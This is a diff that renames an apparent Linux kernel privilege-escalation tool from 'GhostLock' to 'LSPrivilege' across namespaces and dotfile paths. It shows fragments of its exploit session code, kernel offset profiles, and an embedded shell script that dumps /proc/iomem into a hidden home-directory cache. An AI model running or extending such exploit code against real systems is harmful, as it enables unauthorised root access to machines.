@@ -1,5 +1,5 @@
 /*
- * GhostLock — attack primitives, launch/profile selection and timing.
+ * LSPrivilege — attack primitives, launch/profile selection and timing.
  *
  * Split out of main.cpp so the orchestration entry stays a thin adapter. The
  * statement order and log text are unchanged from the original translation
@@ -20,7 +20,7 @@
 #include <sys/mman.h>
 #include <sys/utsname.h>
 
-namespace ghostlock::attack {
+namespace lsprivilege::attack {
     void log_execution_settings(const profile::kernel_offsets *profile) {
         if (!profile) return;
         const profile::execution_settings *e = &profile->execution;
@@ -155,9 +155,9 @@ namespace ghostlock::attack {
                 session::g_exploit_session.profile.values();
         const char *release = values && values->uname_r ? values->uname_r : "";
 
-        snprintf(path.data(), path.size(), "%s/.ghostlock_iomem", (config::runtime_config_snapshot().home_dir.c_str()));
+        snprintf(path.data(), path.size(), "%s/.lsprivilege_iomem", (config::runtime_config_snapshot().home_dir.c_str()));
         if (FILE *f = fopen(path.data(), "r")) {
-            auto close_iomem = ghostlock::support::make_scope_exit(
+            auto close_iomem = lsprivilege::support::make_scope_exit(
                 [f]() noexcept { fclose(f); });
             /* the first line names the release that wrote the dump */
             if (fgets(stamp.data(), static_cast<int32_t>(stamp.size()), f)) {
@@ -270,13 +270,13 @@ namespace ghostlock::attack {
             "  exit 1\n"
             "fi\n"
             /* the rename is atomic, so a failed read leaves the old dump in place */
-            "echo \"# $(uname -r)\" >\"$HOME_DIR/.ghostlock_iomem.new\"\n"
-            "if cat /proc/iomem >>\"$HOME_DIR/.ghostlock_iomem.new\" 2>/dev/null && grep -q 'System RAM' \"$HOME_DIR/.ghostlock_iomem.new\"; then\n"
-            "  mv \"$HOME_DIR/.ghostlock_iomem.new\" \"$HOME_DIR/.ghostlock_iomem\"\n"
-            "  chmod 644 \"$HOME_DIR/.ghostlock_iomem\" 2>/dev/null\n"
-            "  echo \"[*] iomem cache: cached $(wc -c <\"$HOME_DIR/.ghostlock_iomem\") bytes\" >>\"$LOG\"\n"
+            "echo \"# $(uname -r)\" >\"$HOME_DIR/.lsprivilege_iomem.new\"\n"
+            "if cat /proc/iomem >>\"$HOME_DIR/.lsprivilege_iomem.new\" 2>/dev/null && grep -q 'System RAM' \"$HOME_DIR/.lsprivilege_iomem.new\"; then\n"
+            "  mv \"$HOME_DIR/.lsprivilege_iomem.new\" \"$HOME_DIR/.lsprivilege_iomem\"\n"
+            "  chmod 644 \"$HOME_DIR/.lsprivilege_iomem\" 2>/dev/null\n"
+            "  echo \"[*] iomem cache: cached $(wc -c <\"$HOME_DIR/.lsprivilege_iomem\") bytes\" >>\"$LOG\"\n"
             "else\n"
-            "  rm -f \"$HOME_DIR/.ghostlock_iomem.new\"\n"
+            "  rm -f \"$HOME_DIR/.lsprivilege_iomem.new\"\n"
             "  echo '[!] iomem cache: /proc/iomem read failed' >>\"$LOG\"\n"
             "fi\n"
             /* debug archive: copy kernel/pstore/iomem evidence into the
@@ -336,7 +336,7 @@ namespace ghostlock::attack {
             "  echo \"[*] safe mode: $n module(s) disabled\" >>\"$LOG\"\n"
             "fi\n"
             "# step 1: restore policy\n"
-            "POLICY=$(mktemp \"$HOME_DIR/.ghostlock_policy.XXXXXX\") || {\n"
+            "POLICY=$(mktemp \"$HOME_DIR/.lsprivilege_policy.XXXXXX\") || {\n"
             "  echo '[!] cannot create policy dump' >>\"$LOG\"\n"
             "  exit 1\n"
             "}\n"
@@ -514,4 +514,4 @@ namespace ghostlock::attack {
         pr_info("perf task: 0x%016zx (%d/%d votes)\n", best, best_cnt, nc);
         return best;
     }
-} // namespace ghostlock::attack
+} // namespace lsprivilege::attack
